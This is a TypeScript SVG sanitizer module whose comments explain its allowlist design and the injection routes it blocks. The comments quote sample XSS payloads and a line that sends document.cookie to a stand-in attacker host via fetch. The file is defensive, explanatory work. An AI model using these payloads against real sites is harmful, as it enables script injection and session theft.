/**
 * Parser-based SVG sanitizer (story 005 — R1.1 to R1.5).
 *
 * The markup is parsed with Bun's native `HTMLRewriter` (lol-html) and re-emitted
 * from an explicit allowlist: an element or attribute is emitted because it is
 * named here, never because no rule happened to match it. That inverts the
 * denylist the previous regex implementation used, where the security boundary
 * was "what the author remembered".
 *
 * Three properties are load-bearing and each is measured, not assumed:
 *
 * 1. `el.attributes` is invalidated by mutating the element, so attribute names
 *    are collected into an array BEFORE any removal. Removing while iterating
 *    drops only the first attribute and emits every later one untouched —
 *    including every `on*` handler.
 * 2. The parser lowercases names on read and preserves case on write, so both
 *    allowlists are written in lowercase and compared against a lowercased name.
 *    A camelCase allowlist silently drops `viewBox`, which every real logo has.
 * 3. Parsing alone does NOT stop a removal from composing into new markup. A
 *    stray `<` is a text node, and so is `img src=x onerror=alert(1)>`; deleting
 *    the element between them joins the two runs into a tag the parser never
 *    saw. Escaping the delimiters in text nodes closes that, and makes the
 *    output a fixed point of itself (R1.4).
 * 4. The output does not stay in SVG. `logo-search.tool.ts` interpolates it into
 *    a JSX/TSX source file, and in JSX a `{` opens an EXPRESSION CONTAINER
 *    holding arbitrary JavaScript. `<` and `>` are the complete delimiter set
 *    for SVG; they are not for JSX. Measured: a text node reading
 *    `{fetch("https://evil.example/x"+document.cookie)}` is byte-identical
 *    through an SVG-correct sanitizer and transpiles to a LIVE `fetch` call in
 *    the component written into the user's project. `{` and `}` are therefore
 *    escaped in text too, as `&#123;` and `&#125;`, which render as `{` and `}`
 *    in SVG and transpile to an inert string literal in JSX.
 *
 * A consequence of 3 and 4 worth stating rather than discovering: a payload
 * survives as ESCAPED TEXT. `&lt;img src=x onerror=alert(1)&gt;` in the output
 * is not a bypass. The inertness claimed here is exactly what has been measured
 * — no live tag in SVG, and no expression container in the JSX that
 * `convertToFormat` emits — and nothing broader. QUOTED attribute values are not
 * a JSX channel: `d="{x}"` transpiles to the string `"{x}"`, measured, which is
 * why only text nodes are brace-escaped.
 *
 * The function is total: every input returns a string and no path raises. A
 * parser failure returns EMPTY output, never the input — falling open is the
 * failure mode this module exists to remove.
 */

/**
 * The elements that may be emitted, lowercase.
 *
 * Derived from measurement: 7 logos fetched from api.svgl.app on 2026-08-11
 * (github, react, vercel, figma, stripe, google, docker) contributed `path`,
 * `svg`, `stop`, `g`, `defs`, `clipPath`, `rect`, `linearGradient` and
 * `radialGradient`. The rest are the shape and text primitives ordinary in a
 * logo that seven samples simply did not happen to contain.
 *
 * Deliberately absent, each for a reason: `script` (the threat); `foreignObject`
 * (escapes SVG into arbitrary HTML, where this allowlist stops applying);
 * `animate`, `set`, `animateTransform` (retarget any attribute at runtime,
 * including `href`); the `style` ELEMENT (carries a stylesheet — `@import`,
 * `url()`, selectors reaching outside — that this module does not parse);
 * `image`, `iframe`, `embed`, `object` (load external content); `a` (a logo does
 * not need to be a link). Adding a name here is a security change.
 */
const ALLOWED_ELEMENTS: ReadonlySet<string> = new Set([
  "svg",
  "g",
  "defs",
  "symbol",
  "use",
  "title",
  "desc",
  "path",
  "rect",
  "circle",
  "ellipse",
  "line",
  "polyline",
  "polygon",
  "text",
  "tspan",
  "lineargradient",
  "radialgradient",
  "stop",
  "clippath",
  "mask",
  "pattern",
]);

/**
 * How an attribute's value carries a URI, which decides how it is checked.
 *
 * - `whole`  — the value IS a URI. Emitted only as `#fragment` or `https://…`.
 * - `paint`  — a paint or reference that may CONTAIN `url(…)`. Every `url(…)`
 *              must be a same-document fragment, and no scheme may appear
 *              outside one (a paint keyword or colour has no colon in it).
 * - `style`  — a CSS declaration list, where `:` is structural rather than a
 *              scheme separator. Checked by allowlisting the property names.
 */
type UriKind = "whole" | "paint" | "style";

/**
 * The attributes whose value is constrained by R1.3, and how.
 *
 * Every name here is folded into `ALLOWED_ATTRIBUTES` below by construction, so
 * a URI-bearing attribute cannot be admitted in one place and left unchecked in
 * the other — the drift that repeating the names in two literals would invite.
 */
const URI_BEARING_ATTRIBUTES: ReadonlyMap<string, UriKind> = new Map<string, UriKind>([
  ["href", "whole"],
  ["xlink:href", "whole"],
  ["fill", "paint"],
  ["stroke", "paint"],
  ["clip-path", "paint"],
  ["mask", "paint"],
  ["color", "paint"],
  ["stop-color", "paint"],
  ["marker-start", "paint"],
  ["marker-mid", "paint"],
  ["marker-end", "paint"],
  ["style", "style"],
]);

/**
 * The attributes that may be emitted, lowercase. Everything else is removed,
 * including every `on*` handler — which is additionally removed by name before
 * this set is ever consulted, so two independent rules have to fail for a
 * handler to survive.
 */
const ALLOWED_ATTRIBUTES: ReadonlySet<string> = new Set([
  // Constrained by the URI check; listed once, in the map above
  ...URI_BEARING_ATTRIBUTES.keys(),
  // Document and identity
  "xmlns",
  "xmlns:xlink",
  "xml:space",
  "xml:lang",
  "version",
  "id",
  // Rewritten to `className` by the logo tool's JSX/TSX conversion; dropping it
  // would turn that conversion into a silent no-op. Carries no URI, executes
  // nothing.
  "class",
  // Viewport
  "viewbox",
  "preserveaspectratio",
  "width",
  "height",
  "x",
  "y",
  // Geometry
  "d",
  "points",
  "x1",
  "y1",
  "x2",
  "y2",
  "cx",
  "cy",
  "r",
  "rx",
  "ry",
  "fx",
  "fy",
  "fr",
  "dx",
  "dy",
  "rotate",
  "transform",
  "gradienttransform",
  "patterntransform",
  // Units and gradient plumbing
  "gradientunits",
  "clippathunits",
  "maskunits",
  "maskcontentunits",
  "patternunits",
  "patterncontentunits",
  "spreadmethod",
  "offset",
  // Paint
  "fill-rule",
  "fill-opacity",
  "stroke-width",
  "stroke-opacity",
  "stroke-linecap",
  "stroke-linejoin",
  "stroke-dasharray",
  "stroke-dashoffset",
  "stroke-miterlimit",
  "stop-opacity",
  "opacity",
  "clip-rule",
  "paint-order",
  "mix-blend-mode",
  "isolation",
  "enable-background",
  "color-interpolation",
  "color-interpolation-filters",
  "shape-rendering",
  "vector-effect",
  "display",
  "visibility",
  "overflow",
  "pointer-events",
  // Text
  "font-family",
  "font-size",
  "font-weight",
  "font-style",
  "font-variant",
  "font-stretch",
  "letter-spacing",
  "word-spacing",
  "text-anchor",
  "text-decoration",
  "dominant-baseline",
  "alignment-baseline",
  "baseline-shift",
  "writing-mode",
  "direction",
  "textlength",
  "lengthadjust",
]);

/**
 * Property names admitted inside a `style` attribute, lowercase.
 *
 * The `style` ATTRIBUTE is admitted where the `style` ELEMENT is not: it appears
 * in 4 of the 7 measured logos and excluding it would visibly damage them. Its
 * value is a declaration list, so the "any bare scheme must be https" rule that
 * governs a URI attribute cannot be applied to it directly — `fill:red` would
 * read as the scheme `fill`. Allowlisting the property names discriminates
 * `fill:red` (kept) from `javascript:alert(1)` (dropped) without needing a CSS
 * parser, and keeps the mechanism an allowlist. This remains the weakest point
 * of the allowlist: the VALUE side is only checked for `url(…)`.
 */
const ALLOWED_STYLE_PROPERTIES: ReadonlySet<string> = new Set([
  "fill",
  "fill-rule",
  "fill-opacity",
  "stroke",
  "stroke-width",
  "stroke-opacity",
  "stroke-linecap",
  "stroke-linejoin",
  "stroke-dasharray",
  "stroke-dashoffset",
  "stroke-miterlimit",
  "stop-color",
  "stop-opacity",
  "opacity",
  "color",
  "clip-path",
  "clip-rule",
  "mask",
  "marker",
  "marker-start",
  "marker-mid",
  "marker-end",
  "paint-order",
  "mix-blend-mode",
  "isolation",
  "enable-background",
  "color-interpolation",
  "color-interpolation-filters",
  "shape-rendering",
  "text-rendering",
  "image-rendering",
  "vector-effect",
  "display",
  "visibility",
  "overflow",
  "pointer-events",
  "transform",
  "transform-origin",
  "font",
  "font-family",
  "font-size",
  "font-weight",
  "font-style",
  "font-variant",
  "font-stretch",
  "line-height",
  "letter-spacing",
  "word-spacing",
  "text-anchor",
  "text-decoration",
  "text-transform",
  "dominant-baseline",
  "alignment-baseline",
  "baseline-shift",
  "writing-mode",
  "direction",
  "white-space",
]);

/**
 * Named character references that can hide a scheme separator or a scheme
 * letter. Matched case-insensitively, which is looser than HTML — deliberately,
 * since this table only feeds the security CHECK and never the emitted value, so
 * decoding too much can only make the check stricter.
 */
const NAMED_REFERENCES: Readonly<Record<string, string>> = {
  tab: "\t",
  newline: "\n",
  colon: ":",
  semi: ";",
  sol: "/",
  num: "#",
  lt: "<",
  gt: ">",
  amp: "&",
  quot: '"',
  apos: "'",
  nbsp: " ",
  lpar: "(",
  rpar: ")",
  period: ".",
  comma: ",",
  excl: "!",
  quest: "?",
  equals: "=",
  commat: "@",
  dollar: "$",
  percnt: "%",
  ast: "*",
  plus: "+",
  lowbar: "_",
  verbar: "|",
  grave: "`",
  bsol: "\\",
};

/** Control, whitespace and zero-width characters a URL parser ignores. */
const IGNORABLE_CHARACTERS =
  /[\u0000-\u0020\u007f-\u00a0\u1680\u2000-\u200f\u2028\u2029\u202f\u205f\u3000\ufeff]/g;

/** `&#106;`, `&#x6a;`, `&#0000106;`, `&Tab;`. The semicolon is optional only for
 *  the numeric forms, matching how a browser decodes an attribute value. */
const CHARACTER_REFERENCE = /&(?:#[xX]([0-9a-fA-F]+);?|#([0-9]+);?|([a-zA-Z][a-zA-Z0-9]*);)/g;

/** How many decode rounds to run, so `&amp;#106;` cannot hide behind one pass. */
const MAX_DECODE_ROUNDS = 3;

/**
 * The counts reported at `debug` level. The tool's output is unchanged when
 * content is removed (story 005 Assumption 1), so this is the only place the
 * fact survives for a maintainer.
 */
export interface SvgSanitizerCounts {
  readonly elements: number;
  readonly attributes: number;
  readonly comments: number;
  readonly textNodesEscaped: number;
  /** Tags the parser echoed without ever offering them to a handler — a stray
   *  end tag or a tag truncated at end of input — that the output check caught. */
  readonly unadmittedTags: number;
}

/**
 * The logging sink. Structurally satisfied by `Logger` from `src/logger.ts`, so
 * a caller passes its existing logger. Optional, and defaulted to a no-op, so
 * `sanitizeSvg(raw)` stays a valid one-argument call.
 */
export interface SvgSanitizerLogger {
  debug(...args: unknown[]): void;
  error?(...args: unknown[]): void;
}

const SILENT_LOGGER: SvgSanitizerLogger = { debug: () => {} };

/** Decodes character references so an obfuscated scheme cannot hide behind one.
 *
 *  The parser does NOT do this for us: `el.attributes` and `getAttribute()`
 *  return the raw source, so `fill="&#x6a;avascript:alert(1)"` arrives verbatim.
 *  Measured on Bun 1.3.14. */
function decodeCharacterReferences(value: string): string {
  let current = value;

  for (let round = 0; round < MAX_DECODE_ROUNDS; round++) {
    const decoded = current.replace(
      CHARACTER_REFERENCE,
      (match: string, hex?: string, decimal?: string, name?: string): string => {
        if (hex !== undefined) return fromCodePoint(Number.parseInt(hex, 16));
        if (decimal !== undefined) return fromCodePoint(Number.parseInt(decimal, 10));
        if (name !== undefined) return NAMED_REFERENCES[name.toLowerCase()] ?? match;
        return match;
      }
    );

    if (decoded === current) break;
    current = decoded;
  }

  return current;
}

/** Total: an out-of-range or unparsable code point yields nothing rather than
 *  raising, which would make the sanitizer fall open on a crafted value. */
function fromCodePoint(codePoint: number): string {
  if (!Number.isFinite(codePoint) || codePoint < 0 || codePoint > 0x10ffff) return "";
  try {
    return String.fromCodePoint(codePoint);
  } catch {
    return "";
  }
}

/** The value as a URL parser would see it: decoded, stripped of the whitespace
 *  and zero-width characters it ignores, and lowercased for comparison. */
function normalizeForCheck(value: string): string {
  return decodeCharacterReferences(value).replace(IGNORABLE_CHARACTERS, "").toLowerCase();
}

interface UrlSplit {
  /** The argument of every `url(…)` found, in order. */
  readonly args: readonly string[];
  /** Everything outside those `url(…)` spans, concatenated. */
  readonly remainder: string;
}

/** Splits a normalized value into its `url(…)` arguments and everything else.
 *  An unterminated `url(` yields the rest of the value as its argument, so a
 *  truncated payload is checked rather than skipped. */
function splitUrlFunctions(probe: string): UrlSplit {
  const args: string[] = [];
  let remainder = "";
  let index = 0;

  while (index < probe.length) {
    const start = probe.indexOf("url(", index);
    if (start === -1) {
      remainder += probe.slice(index);
      break;
    }

    remainder += probe.slice(index, start);
    const open = start + "url(".length;
    const close = probe.indexOf(")", open);

    if (close === -1) {
      args.push(probe.slice(open));
      break;
    }

    args.push(probe.slice(open, close));
    index = close + 1;
  }

  return { args, remainder };
}

function stripQuotes(value: string): string {
  if (value.length >= 2) {
    const first = value[0];
    const last = value[value.length - 1];
    if ((first === '"' || first === "'") && first === last) return value.slice(1, -1);
  }
  return value;
}

/** Every declaration in a `style` value names an allowlisted property, and no
 *  declaration value carries a scheme of its own. */
function isSafeStyleRemainder(remainder: string): boolean {
  for (const declaration of remainder.split(";")) {
    if (declaration === "") continue;

    const separator = declaration.indexOf(":");
    if (separator === -1) return false;

    const property = declaration.slice(0, separator);
    if (!ALLOWED_STYLE_PROPERTIES.has(property)) return false;

    // A second colon means something other than a property/value pair.
    if (declaration.includes(":", separator + 1)) return false;
  }

  return true;
}

/**
 * R1.3. An emitted URI is a same-document fragment or an `https` URL, judged
 * after character references have been decoded.
 */
function isSafeUriValue(kind: UriKind, rawValue: string): boolean {
  const probe = normalizeForCheck(rawValue);

  // A CSS escape or a legacy `expression()` can reconstruct any of the above.
  if (probe.includes("\\") || probe.includes("expression(")) return false;

  const { args, remainder } = splitUrlFunctions(probe);

  // `clip-path="url(#clip0)"` is the legitimate form; `url(javascript:…)` and
  // `url(https://evil/x)` are not — a reference that leaves the document is
  // refused even when its scheme is https, because a logo has no need of one.
  for (const arg of args) {
    if (!stripQuotes(arg).startsWith("#")) return false;
  }

  switch (kind) {
    case "whole":
      if (args.length > 0) return false;
      return probe.startsWith("#") || probe.startsWith("https://");
    case "paint":
      // Outside `url(…)` a paint value is a keyword, a colour or a number, none
      // of which contains a colon. A scheme therefore cannot appear at all.
      return !remainder.includes(":");
    case "style":
      return isSafeStyleRemainder(remainder);
  }
}

/**
 * The whole attribute rule, in one place: an attribute is emitted only if it is
 * not an event handler, is named in the allowlist, and — where it carries a URI
 * — that URI satisfies R1.3.
 *
 * `lowercasedName` is what the parser reports; `rawValue` is the undecoded
 * source text, which is what `getAttribute` returns.
 */
function shouldRemoveAttribute(lowercasedName: string, rawValue: string): boolean {
  // Checked before the allowlist, so a handler has to defeat two independent
  // rules rather than one.
  if (lowercasedName.startsWith("on")) return true;

  if (!ALLOWED_ATTRIBUTES.has(lowercasedName)) return true;

  const uriKind = URI_BEARING_ATTRIBUTES.get(lowercasedName);
  return uriKind !== undefined && !isSafeUriValue(uriKind, rawValue);
}

/**
 * Escapes every delimiter that could reopen a language this text will cross.
 *
 * `<` and `>` are R1.4: without them, removing an element joins the text on
 * either side of it into markup the parser never saw.
 *
 * `{` and `}` are the JSX boundary. The output is interpolated into a `.jsx` or
 * `.tsx` source file by `logo-search.tool.ts`, where `{` opens an expression
 * container holding arbitrary JavaScript. They are escaped as numeric character
 * references, which render as `{` and `}` in SVG and transpile to an inert
 * string literal in JSX.
 *
 * `&` is deliberately NOT escaped. Escaping it would re-encode this function's
 * own output on every pass, growing the string without bound and destroying the
 * fixed point R1.4 requires. No replacement below introduces `<`, `>`, `{` or
 * `}`, so applying this twice changes nothing.
 */
function escapeTextDelimiters(text: string): string {
  return text
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll("{", "&#123;")
    .replaceAll("}", "&#125;");
}

/** The characters HTML treats as whitespace inside a tag. */
function isTagWhitespace(char: string): boolean {
  return char === " " || char === "\t" || char === "\n" || char === "\r" || char === "\f";
}

/** A tag name, as the parser would read it. `<` is deliberately NOT a name
 *  character here: an end tag whose name contains one is the leak this exists
 *  to catch. */
const TAG_NAME = /^[a-zA-Z][a-zA-Z0-9:._-]*/;

interface TagSpan {
  /** Index one past the closing `>`. */
  readonly end: number;
  readonly name: string;
  readonly isEndTag: boolean;
}

/**
 * Scans the tag beginning at `start`, where `markup[start]` is `<`.
 *
 * Returns `null` for anything that is not a complete, well-formed tag —
 * including a tag truncated at end of input, and any tag containing a `<`
 * outside a quoted attribute value. That last rule is the important one: the
 * HTML tokenizer accepts `<` as a tag-NAME character, so `</a<script>` is a
 * single end tag to it, and echoing it verbatim is what carried a live
 * `<script` into the output. Refusing it here means a tag copied through
 * unchanged can only contain `<` inside a quoted value, where it is inert.
 *
 * Quoted values are honoured, so a `>` inside one does not end the tag; a quote
 * is only significant directly after `=`, so the unquoted value in
 * `<path d=a"b>` is read as the parser reads it.
 */
function scanTag(markup: string, start: number): TagSpan | null {
  let index = start + 1;

  const isEndTag = markup[index] === "/";
  if (isEndTag) index++;

  const nameMatch = markup.slice(index).match(TAG_NAME);
  if (nameMatch === null) return null;

  const name = nameMatch[0];
  index += name.length;

  // HTML ignores attributes on an end tag, so both tag kinds are scanned with
  // the same loop; the caller drops an end tag's attributes when it re-emits.
  while (index < markup.length) {
    const char = markup[index];

    if (isTagWhitespace(char)) {
      index++;
      continue;
    }
    if (char === ">") return { end: index + 1, name, isEndTag };
    if (char === "/" && markup[index + 1] === ">") return { end: index + 2, name, isEndTag };
    if (char === "<") return null;

    // An attribute name, then optionally `=` and a value.
    const nameStart = index;
    while (index < markup.length) {
      const current = markup[index];
      if (isTagWhitespace(current) || current === "=" || current === ">" || current === "<") break;
      if (current === "/" && markup[index + 1] === ">") break;
      index++;
    }
    // Guarantees progress, so the loop always terminates.
    if (index === nameStart) index++;

    let cursor = index;
    while (cursor < markup.length && isTagWhitespace(markup[cursor])) cursor++;
    if (markup[cursor] !== "=") continue;

    cursor++;
    while (cursor < markup.length && isTagWhitespace(markup[cursor])) cursor++;

    const quote = markup[cursor];
    if (quote === '"' || quote === "'") {
      const close = markup.indexOf(quote, cursor + 1);
      if (close === -1) return null;
      index = close + 1;
      continue;
    }

    while (
      cursor < markup.length &&
      !isTagWhitespace(markup[cursor]) &&
      markup[cursor] !== ">" &&
      markup[cursor] !== "<"
    ) {
      cursor++;
    }
    index = cursor;
  }

  return null;
}

/**
 * R1.1, verified on the output rather than assumed from the input.
 *
 * Two constructs reach the output WITHOUT passing the element handler, because
 * lol-html surfaces neither to a handler and echoes both verbatim (measured on
 * Bun 1.3.14):
 *
 *   - a stray end tag, whose name may itself contain `<`, so `</a<script>`
 *     carries a live `<script` into the output;
 *   - a tag truncated at end of input, so `<script src="x"` does the same, and
 *     the element handler never fires for it at all.
 *
 * `element.onEndTag()` does not reach the first — it fires only for an end tag
 * that has a matching start tag — and there is no document-level end-tag
 * handler. So the invariant is enforced here instead, by the same allowlist:
 * every `<` must open a well-formed tag whose name is admitted, or it is
 * escaped along with its `>`. Escaping rather than deleting keeps a benign
 * document readable and keeps the result a fixed point.
 */
function neutralizeUnadmittedTags(markup: string, onNeutralized: () => void): string {
  if (!markup.includes("<")) return markup;

  let result = "";
  let index = 0;

  while (index < markup.length) {
    const next = markup.indexOf("<", index);
    if (next === -1) {
      // A bare `>` out here belonged to a token that is being escaped, so it is
      // escaped too. Leaving it would let the NEXT pass escape it instead, and
      // the output would not be a fixed point. The same holds for a brace that
      // came from inside a token, which no text handler ever saw.
      result += escapeTextDelimiters(markup.slice(index));
      break;
    }

    result += escapeTextDelimiters(markup.slice(index, next));

    const tag = scanTag(markup, next);

    if (tag !== null && ALLOWED_ELEMENTS.has(tag.name.toLowerCase())) {
      // An end tag is re-emitted canonically. HTML ignores attributes on one,
      // and echoing them would carry attacker-controlled text through verbatim;
      // escaping the whole token instead would destroy the closing tag and
      // leave the markup unbalanced. `</name>` is provably inert: the name
      // matched TAG_NAME and is in the allowlist.
      result += tag.isEndTag ? `</${tag.name}>` : markup.slice(next, tag.end);
      index = tag.end;
      continue;
    }

    onNeutralized();

    if (tag !== null) {
      // Well formed but not admitted: escape the whole token, so no fragment of
      // it can be read as markup by anything downstream.
      result += escapeTextDelimiters(markup.slice(next, tag.end));
      index = tag.end;
      continue;
    }

    // Not a tag at all. Escape the delimiter and re-examine what follows it,
    // since a `<` can be buried inside a malformed token.
    result += "&lt;";
    index = next + 1;
  }

  return result;
}

/**
 * Parses `raw` and re-emits only what the allowlists admit.
 *
 * @param raw    Untrusted markup, typically an SVG fetched from a third party.
 * @param logger Optional sink for the `debug`-level removal counts. Defaults to
 *               a no-op, so `sanitizeSvg(raw)` remains a valid call.
 * @returns The sanitized markup. Empty on a parser failure — never the input.
 */
export async function sanitizeSvg(
  raw: string,
  logger: SvgSanitizerLogger = SILENT_LOGGER
): Promise<string> {
  if (typeof raw !== "string" || raw === "") return "";

  let elements = 0;
  let attributes = 0;
  let comments = 0;
  let textNodesEscaped = 0;
  let unadmittedTags = 0;

  try {
    const parsed = new HTMLRewriter()
      .on("*", {
        element(element) {
          const tagName = element.tagName.toLowerCase();

          if (!ALLOWED_ELEMENTS.has(tagName)) {
            // `remove()`, never `removeAndKeepContent()`: the content of a
            // rejected element is exactly what must not survive it.
            element.remove();
            elements++;
            return;
          }

          // Collect BEFORE removing. Mutating the element invalidates the
          // `el.attributes` iterator, which drops only the first attribute and
          // emits every later one — including every `on*` handler.
          //
          // The PAIRS are collected, not just the names: an element may carry
          // the same attribute twice, and `getAttribute` returns only the first
          // occurrence, so checking by name would inspect a value that is not
          // the one a consumer uses. Browsers take the first duplicate, JSX
          // takes the LAST — so the unchecked one is exactly the one that
          // reaches the user's component.
          const pairs = [...element.attributes];
          const doomed = new Set<string>();

          for (const [name, value] of pairs) {
            if (shouldRemoveAttribute(name.toLowerCase(), value)) doomed.add(name);
          }

          for (const name of doomed) {
            // `removeAttribute` removes ONE occurrence, so a duplicate needs
            // one call each. Bounded by the number of attributes seen, which
            // guarantees termination whatever the parser reports.
            for (let attempt = 0; attempt < pairs.length && element.hasAttribute(name); attempt++) {
              element.removeAttribute(name);
              attributes++;
            }
          }
        },
      })
      .onDocument({
        text(chunk) {
          const escaped = escapeTextDelimiters(chunk.text);
          // Replacing only when the text actually changed keeps an untouched
          // node byte-identical, which is what makes a second pass a no-op.
          if (escaped === chunk.text) return;

          chunk.replace(escaped, { html: true });
          textNodesEscaped++;
        },
        comments(comment) {
          // A comment carries markup no allowlist inspects, and it survives a
          // round trip into JSX where it can be re-parsed. A processing
          // instruction such as `<?xml …?>` arrives here too, as a bogus
          // comment, and leaves the same way.
          comment.remove();
          comments++;
        },
        doctype(doctype) {
          // Nothing downstream needs it, and removing it here means the output
          // check below can treat every `<!` construct except CDATA as foreign.
          doctype.remove();
          comments++;
        },
      })
      .transform(raw);

    const output = neutralizeUnadmittedTags(parsed, () => {
      unadmittedTags++;
    });

    if (elements > 0 || attributes > 0 || comments > 0 || textNodesEscaped > 0 || unadmittedTags > 0) {
      logger.debug("svg_sanitize_removed", {
        elements,
        attributes,
        comments,
        textNodesEscaped,
        unadmittedTags,
      } satisfies SvgSanitizerCounts);
    }

    return output;
  } catch (error) {
    // Fail closed. Returning the input on a parser failure is the behaviour this
    // module exists to remove.
    logger.error?.("svg_sanitize_failed", {
      reason: error instanceof Error ? error.message : String(error),
      inputLength: raw.length,
    });
    return "";
  }
}
